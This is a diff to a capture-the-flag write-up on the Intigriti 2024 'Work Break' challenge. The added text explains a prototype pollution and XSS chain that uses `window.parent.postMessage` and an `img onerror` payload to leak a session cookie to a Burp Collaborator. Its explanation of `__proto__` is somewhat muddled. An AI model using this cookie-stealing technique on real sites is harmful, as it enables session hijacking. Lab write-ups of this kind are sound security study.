@@ -726,7 +726,13 @@ Let's test out simple prototype pollution if we can inject more properties. <br>
 ```
 ![Work Break Prototype Pollution](/assets/img/Intigriti-ctf_2024/work_break_prototype_pollution.png)
 
-It shows "Settings updated successfully". Now we can inject more properties and curl to our burp collaborator to get the SID. <br>
+It shows "Settings updated successfully". The reason why we use `__proto__` but not using normal property is because:
+- Can not exploit the Object.prototype
+- No overall impact to the application
+- Other objects will not be affected
+
+So we need to use `__proto__` to trigger prototype chain pollution. <br>
+Now we can inject more properties and curl to our burp collaborator to get the SID. <br>
 ```json
 {
     "name":"Anon",
@@ -742,9 +748,39 @@ It shows "Settings updated successfully". Now we can inject more properties and 
     }
 }
 ```
+The reason we use `postMessage` instead of `alert` is that in source code at `chat.js`.
+```js
+document.getElementById("totalTasks").innerHTML = `<p>Total tasks completed: ${event.data.totalTasks}</p>`;
+```
+- This code has event listener for message and render HTML. So using `alert` will just pop up the alert but not render the HTML. <br>
+- When using `postMessage`, our payload will be rendered through `innerHTML` and we can get the cookie from the response. <br>
+
+And also measure to set date to real time in order to avoid the date is not up to date. <br>
+
+Last thing is that why we need to use `window.parent`:
+1. Context Hierarchy.
+```
+Parent Window (Main Page)
+    |
+    └── iframe (Performance Frame)
+```
+- Our payload is in the iframe.
+- Need to send the message to the parent window to trigger the `innerHTML` to get the cookie.
+2. If we use `postMessage` for example:
+```js
+"tasksCompleted": "<img src=x onerror='postMessage({\"totalTasks\":\"...\"}, \"*\");'>"
+```
+- The message will be sent to the iframe itself.
+- Not the parent window.
+- Can not trigger the `innerHTML` to get the cookie.
+3. For `window.parent.postMessage`:
+- The message will be sent from the iframe to the parent window.
+- Parent window will handle the message.
+- Trigger the `innerHTML` to get the cookie.
+
 ![Work Break Prototype Pollution 2](/assets/img/Intigriti-ctf_2024/work_break_prototype_pollution_2.png)
 
-When we reload the profile page, we can see there is appears:
+Now when we sent the payload and reload the profile page, we can see there is appears:
 ```
 Total tasks completed: error image
 Tasks Completed Today: error image
